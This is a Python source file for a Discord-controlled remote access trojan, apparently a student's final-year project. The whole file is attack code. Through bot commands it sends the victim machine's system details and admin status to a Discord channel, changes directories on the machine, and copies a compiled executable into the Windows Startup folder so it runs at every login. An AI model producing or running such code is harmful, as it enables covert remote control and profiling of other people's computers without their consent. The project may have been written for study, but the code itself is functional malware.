import discord
import os
import platform
import shutil
import ctypes

token = 'REMOVED'

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'User {client.user} has been logged in')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    elif message.content.startswith('!sysinfo'):
        uname = platform.uname()
        await message.channel.send(f'System Info\nSystem: {uname.system}{uname.release}\nPC name: {uname.node}\nVersion: {uname.version}\nMachine: {uname.machine}')

    elif message.content.startswith('!winadmin'):
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if is_admin == True:
            await message.channel.send('Program has admin rights')
        elif is_admin == False:
            await message.channel.send('Program does not have admin rights')

    elif message.content.startswith('!cd'):
        os.chdir(str(message.content[len('!cd '):]))
        await message.channel.send(f'Current directory: {os.getcwd()}')

    elif message.content == '!cwd':
        await message.channel.send(f'Current directory: {os.getcwd()}')

    elif message.content == '!winstartup':
        user = os.getlogin()
        filepath = os.path.realpath(__file__)
        shutil.copy("E:\FYP Discord RAT\pyinstaller result\main.exe", f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        await message.channel.send('Enabled Startup')







client.run(token)